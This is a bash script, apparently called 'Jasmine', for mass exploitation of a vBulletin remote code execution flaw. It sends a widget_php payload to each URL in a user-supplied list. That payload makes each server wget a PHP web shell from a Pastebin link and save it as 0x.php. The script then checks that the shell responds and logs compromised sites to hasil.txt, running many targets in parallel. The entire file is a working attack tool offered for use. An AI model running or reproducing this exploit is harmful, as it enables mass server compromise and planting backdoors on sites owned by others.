#!/bin/bash
merah='\e[91m'
cyan='\e[96m'
kuning='\e[93m'
oren='\033[0;33m' 
margenta='\e[95m'
biru='\e[94m'
ijo="\e[92m"
putih="\e[97m"
normal='\033[0m'
bold='\e[1m'
labelmerah='\e[41m'
labelijo='\e[42m'
labelkuning='\e[43m'
vbullet(){
  rce=$(curl -skL --connect-timeout 15 --max-time 15 "$1/ajax/render/widget_tabbedcontainer_tab_panel" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: id,en-US;q=0.7,en;q=0.3' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'TE: Trailers' --data "subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo system('wget https://pastebin.com/raw/WQkjFQzD -O 0x.php');" -L)
  if [[ $rce =~ "template" ]]; then
    cekshel=$(curl -skL --connect-timeout 15 --max-time 15 "$1/0x.php" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: id,en-US;q=0.7,en;q=0.3' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'TE: Trailers' -L)
    if [[ $cekshel =~ "Jasmine" ]]; then
      printf "${labelijo}-- VULN --${normal} ${bold}($1/0x.php)\n"
      echo "$1/0x.php">>hasil.txt
    else
      printf "${labelmerah}-- DEAD --${normal} ${bold} ${1}\n"
    fi
  else
    printf "${labelmerah}-- DEAD --${normal} ${bold} ${1}\n"
  fi
}
cat << "EOF"
                      .".
                     /  |
                    /  /
                   / ,"
       .-------.--- /
      "._ __.-/ o. o\
         "   (    Y  )
              )     /
             /     (
            /       Y
        .-"         |
       /  _     \    \
      /    `. ". ) /' )
     Y       )( / /(,/
    ,|      /     )
   ( |     /     /
    " \_  (__   (__        [Jasmine - Vbulletin RCE]
        "-._,)--._,)      
EOF
echo ""
read -p "List URL : " listna;
read -p "Thread : " th;

IFS=$'\r\n' GLOBIGNORE='*' command eval 'bacot=($(cat $listna))'
waktumulai=$(date +%s)
for (( i = 0; i <"${#bacot[@]}"; i++ )); do
  WOW="${bacot[$i]}"
  IFS='' read -r -a array <<< "$WOW"
  ipx=${array[0]}
  ((cthread=cthread%th)); ((cthread++==0)) && wait
  vbullet ${ipx} &
done
wait
